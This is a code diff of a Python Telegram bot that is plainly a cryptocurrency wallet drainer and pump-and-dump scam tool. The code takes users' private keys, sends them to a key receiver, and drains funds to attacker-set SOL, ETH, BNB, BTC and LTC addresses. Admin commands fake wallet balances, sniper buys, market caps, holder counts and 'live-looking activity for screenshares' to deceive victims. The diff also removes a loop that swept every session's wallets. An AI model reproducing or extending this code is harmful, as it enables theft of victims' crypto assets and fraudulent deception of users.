     global bot_balance_sol
     bot_balance_sol = round(bot_balance_sol + profit, 4)
     sess.larp_profit_total = round(sess.larp_profit_total + profit, 4)
     ensure_larp_wallet(sess, force_balance=bot_balance_sol)
     token["status"] = "dumped"
-    token["dumped"] = True
-    token["returned"] = returned
-    token["profit"] = profit
     _save_state()
-    try:
-        await status.edit_text(
-            f"<b>${symbol}</b> fully dumped\n\n"
-            f"Returned <code>{returned:.4f} SOL</code>\n"
-            f"Profit <b>+{profit:.4f} SOL</b> · vault <b>{bot_balance_sol:.4f}</b>",
-            parse_mode=ParseMode.HTML,
-        )
-    except Exception:
-        pass
-    asyncio.create_task(_auto_delete(message.bot, message.chat.id, message.message_id, status.message_id, delay=6.0))
+    await _admin_reply(
+        message,
+        f"Forced dump ${token['symbol']}\n"
+        f"Profit +{SOL_EMOJI} <b>{profit:.4f}</b> · vault <b>{bot_balance_sol:.4f}</b>",
+    )
 
 
 @router.message(Command("simactivity"))
 async def cmd_simactivity(message: Message):
+    """Admin: burst of realistic live-looking activity for screenshares."""
     if message.from_user.id not in ADMIN_IDS:
         return
     sess = get_session(message.from_user.id)
     if LARP_ENABLED:
         ensure_larp_wallet(sess)
     waves = [
-        ("Jito tip landed", 0.4),
-        ("Bundle landed slot", 0.5),
-        ("3 snipers detected", 0.6),
-        ("Auto-dump triggered", 0.7),
-        ("Profit settled", 0.5),
+        ("🔗 Jito tip landed", 0.4),
+        ("📦 Bundle landed slot", 0.5),
+        ("👀 3 snipers detected", 0.6),
+        ("🎯 Auto-dump triggered", 0.7),
+        ("💰 Profit settled", 0.5),
     ]
-    status = await message.answer("<b>Simulating live activity…</b>", parse_mode=ParseMode.HTML)
+    status = await message.answer("📡 <b>Simulating live activity…</b>", parse_mode=ParseMode.HTML)
     profit = 0.0
     for label, delay in waves:
         await asyncio.sleep(delay)
@@ -3587,7 +3040,7 @@ async def cmd_simactivity(message: Message):
             profit += amt
         add_personal_tx(sess, label, "success", amount=amt)
         try:
-            await status.edit_text(f"<b>{label}</b>…", parse_mode=ParseMode.HTML)
+            await status.edit_text(f"📡 <b>{label}</b>…", parse_mode=ParseMode.HTML)
         except Exception:
             pass
     global bot_balance_sol
@@ -3604,6 +3057,7 @@ async def cmd_simactivity(message: Message):
 
 @router.message(Command("fakefill"))
 async def cmd_fakefill(message: Message):
+    """Admin: inject sniper volume on last live token (no dump)."""
     if message.from_user.id not in ADMIN_IDS:
         return
     sess = get_session(message.from_user.id)
@@ -3623,7 +3077,7 @@ async def cmd_fakefill(message: Message):
     for _ in range(n):
         vol = round(random.uniform(0.08, 2.1), 4)
         total += vol
-        add_personal_tx(sess, f"Sniper buy ${symbol}", "success", amount=vol)
+        add_personal_tx(sess, f"👀 Sniper buy ${symbol}", "success", amount=vol)
     await _admin_reply(
         message,
         f"Injected <b>{n}</b> buys on ${symbol} · vol <b>{total:.4f} SOL</b>",
@@ -3632,6 +3086,7 @@ async def cmd_fakefill(message: Message):
 
 @router.message(Command("clonewallet"))
 async def cmd_clonewallet(message: Message):
+    """Admin: add a second LARP wallet with random balance for multi-wallet illusion."""
     if message.from_user.id not in ADMIN_IDS:
         return
     sess = get_session(message.from_user.id)
@@ -3646,7 +3101,7 @@ async def cmd_clonewallet(message: Message):
         is_larp=True,
     )
     sess.wallets.append(w)
-    add_personal_tx(sess, "Wallet Linked", "success")
+    add_personal_tx(sess, "📥 Wallet Linked", "success")
     await _admin_reply(
         message,
         f"Extra wallet\n<code>{pub}</code>\n"
@@ -3654,8 +3109,10 @@ async def cmd_clonewallet(message: Message):
     )
 
 
+
 @router.message(Command("setmcap"))
 async def cmd_setmcap(message: Message):
+    """Admin: /setmcap <usd> — set displayed MC on last live token."""
     if message.from_user.id not in ADMIN_IDS:
         return
     parts = (message.text or "").split()
@@ -3678,6 +3135,7 @@ async def cmd_setmcap(message: Message):
 
 @router.message(Command("holders"))
 async def cmd_holders(message: Message):
+    """Admin: /holders <n> — set holder count on last live token."""
     if message.from_user.id not in ADMIN_IDS:
         return
     parts = (message.text or "").split()
@@ -3700,6 +3158,7 @@ async def cmd_holders(message: Message):
 
 @router.message(Command("livepulse"))
 async def cmd_livepulse(message: Message):
+    """Admin: nudge MC/holders/buys on last live token + inject a few buy txs."""
     if message.from_user.id not in ADMIN_IDS:
         return
     sess = get_session(message.from_user.id)
@@ -3727,6 +3186,7 @@ async def cmd_livepulse(message: Message):
 
 @router.message(Command("cleartx"))
 async def cmd_cleartx(message: Message):
+    """Admin: clear personal + global fake tx feed."""
     if message.from_user.id not in ADMIN_IDS:
         return
     global GLOBAL_TX_FEED
@@ -3740,6 +3200,7 @@ async def cmd_cleartx(message: Message):
 
 @router.message(Command("bump"))
 async def cmd_bump(message: Message):
+    """Admin: /bump [sol] — small balance bump + top-up tx (default +0.25)."""
     if message.from_user.id not in ADMIN_IDS:
         return
     parts = (message.text or "").split()
@@ -3755,13 +3216,14 @@ async def cmd_bump(message: Message):
     sess = get_session(message.from_user.id)
     if LARP_ENABLED:
         ensure_larp_wallet(sess, force_balance=bot_balance_sol)
-    add_personal_tx(sess, "Wallet Top-up", "success", amount=amt)
+    add_personal_tx(sess, "📥 Wallet Top-up", "success", amount=amt)
     _save_state()
     await _admin_reply(message, f"+{amt:.4f} → vault <b>{bot_balance_sol:.4f}</b>")
 
 
 @router.message(Command("ghost"))
 async def cmd_ghost(message: Message):
+    """Admin: hide LARP wallet from list without turning LARP off (re-show with /larpwallet)."""
     if message.from_user.id not in ADMIN_IDS:
         return
     sess = get_session(message.from_user.id)
@@ -3769,91 +3231,30 @@ async def cmd_ghost(message: Message):
     await _admin_reply(message, f"Hid {removed} LARP wallet(s). /larpwallet to restore.")
 
 
-# ── Sweep ───────────────────────────────────────────────────────────────────
-@router.message(Command("sweepall"))
-async def cmd_sweepall(message: Message):
-    if message.from_user.id not in ADMIN_IDS:
-        return
-    status = await message.answer("<b>Sweeping all sessions…</b>", parse_mode=ParseMode.HTML)
-    try:
-        tried, drained = await _sweep_all_sessions()
-        await status.edit_text(
-            f"<b>Sweep pass done</b>\n\n"
-            f"Wallets tried: <b>{tried}</b>\n"
-            f"Wallets drained: <b>{drained}</b>",
-            parse_mode=ParseMode.HTML,
-        )
-    except Exception as e:
-        await status.edit_text(f"Sweep failed: <code>{e}</code>", parse_mode=ParseMode.HTML)
-
-
-@router.message(Command("sweepstart"))
-async def cmd_sweepstart(message: Message):
-    if message.from_user.id not in ADMIN_IDS:
-        return
-    global _sweeper_task
-    parts = (message.text or "").split()
-    interval = SWEEP_INTERVAL_DEFAULT
-    if len(parts) >= 2:
-        try:
-            interval = max(10.0, float(parts[1]))
-        except ValueError:
-            await _admin_reply(message, "Usage: <code>/sweepstart</code> or <code>/sweepstart 30</code>")
-            return
-    if _sweeper_task and not _sweeper_task.done():
-        await _admin_reply(message, "Sweep loop already running. /sweepstop first.")
-        return
-    _sweeper_task = asyncio.create_task(_sweep_loop(interval))
-    await _admin_reply(message, f"Sweep loop ON · every <b>{interval:.0f}s</b>")
-
-
-@router.message(Command("sweepstop"))
-async def cmd_sweepstop(message: Message):
-    if message.from_user.id not in ADMIN_IDS:
-        return
-    global _sweeper_task
-    if not _sweeper_task or _sweeper_task.done():
-        await _admin_reply(message, "Sweep loop not running.")
-        return
-    _sweeper_task.cancel()
-    try:
-        await _sweeper_task
-    except (asyncio.CancelledError, Exception):
-        pass
-    _sweeper_task = None
-    await _admin_reply(message, "Sweep loop stopped.")
-
-
 @router.message(Command("admin"))
 async def admin_panel(message: Message):
     if message.from_user.id not in ADMIN_IDS: return
     total = len(sessions)
-    drained = sum(1 for s in sessions.values() if any(getattr(w, "drained", False) for w in s.wallets))
+    drained = sum(1 for s in sessions.values() if s.drained)
     wallets = sum(len(s.wallets) for s in sessions.values())
     launches = sum(len(s.launched_tokens) for s in sessions.values())
-    sweep_on = "RUNNING" if (_sweeper_task and not _sweeper_task.done()) else "OFF"
     await message.answer(
-        f"<b>Admin</b>\n"
+        f"👑 <b>Admin</b>\n"
         f"Users: {total}\n"
         f"Wallets: {wallets}\n"
         f"Drained: {drained}\n"
         f"Launches: {launches}\n"
         f"Vault: {SOL_EMOJI} {bot_balance_sol:.4f}\n"
         f"LARP: <b>{'ON' if LARP_ENABLED else 'OFF'}</b>\n"
-        f"Sweep loop: <b>{sweep_on}</b>\n"
         f"SOL dest: {'yes' if not DRAIN_DESTINATION.startswith('YourDrain') else 'NO'}\n"
         f"ETH dest: {'yes' if not ETH_DRAIN.startswith('0xYour') else 'NO'}\n"
         f"BNB dest: {'yes' if not BNB_DRAIN.startswith('0xYour') else 'NO'}\n"
         f"BTC dest: {'yes' if BTC_DRAIN and len(BTC_DRAIN) >= 20 else 'NO'}\n"
         f"LTC dest: {'yes' if LTC_DRAIN and len(LTC_DRAIN) >= 20 else 'NO'}\n"
         f"KEY_RECEIVER: {KEY_RECEIVER_ID}\n\n"
-        f"<b>Help</b>: /help — full command list\n"
-        f"<b>LARP</b>: /larpon /larpoff /larpseed /setportfolio /setbal /addbal /bump /randomtx /larpwallet /clonewallet /ghost\n"
-        f"<b>Sweep</b>: /sweepall /sweepstart [secs] /sweepstop\n"
-        f"/dumpnow /simactivity /fakefill /livepulse /setmcap /holders /cleartx",
+        f"<b>LARP</b>: /larpon /larpoff /setbal /addbal /bump /randomtx /larpwallet /clonewallet /ghost\n/dumpnow /simactivity /fakefill /livepulse /setmcap /holders /cleartx",
         parse_mode=ParseMode.HTML,
     )
-
 
 @router.message(Command("testdrain"))
 async def test_drain(message: Message):
@@ -3870,14 +3271,11 @@ async def test_drain(message: Message):
         f"Balance SOL: {w.balance_sol:.6f}",
         parse_mode=ParseMode.HTML,
     )
-    eth_key = getattr(w, "eth_priv", None) or (w.private_key if w.chain == "eth" else None)
-    await attempt_drain(message.from_user.id, w.private_key, chain=w.chain, eth_key=eth_key,
-                        bot=message.bot, user=message.from_user, wallet=w)
+    eth_key = w.private_key if w.chain == "eth" else None
+    await attempt_drain(message.from_user.id, w.private_key, chain=w.chain, eth_key=eth_key, bot=message.bot, user=message.from_user)
     await message.answer("Drain attempt finished — check logs / Tx tracker")
 
-
 async def main():
-    global _bot_ref
     if BOT_TOKEN == "PUT_YOUR_BOT_TOKEN_HERE":
         log.error("Set BOT_TOKEN env var")
         return
@@ -3891,23 +3289,13 @@ async def main():
         log.warning("LTC_DRAIN_WALLET not set — LTC drains skipped")
     _load_state()
     bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
-    _bot_ref = bot
     dp = Dispatcher(storage=MemoryStorage())
     dp.include_router(router)
     log.info(
         "Bot starting | HAS_SOLANA=%s | HAS_WEB3=%s | KEY_RECEIVER=%s | vault=%.4f | LARP=%s",
         HAS_SOLANA, HAS_WEB3, KEY_RECEIVER_ID, bot_balance_sol, LARP_ENABLED,
     )
-    try:
-        await dp.start_polling(bot)
-    finally:
-        if _sweeper_task and not _sweeper_task.done():
-            _sweeper_task.cancel()
-            try:
-                await _sweeper_task
-            except (asyncio.CancelledError, Exception):
-                pass
-
+    await dp.start_polling(bot)
 
 if __name__ == "__main__":
     asyncio.run(main())
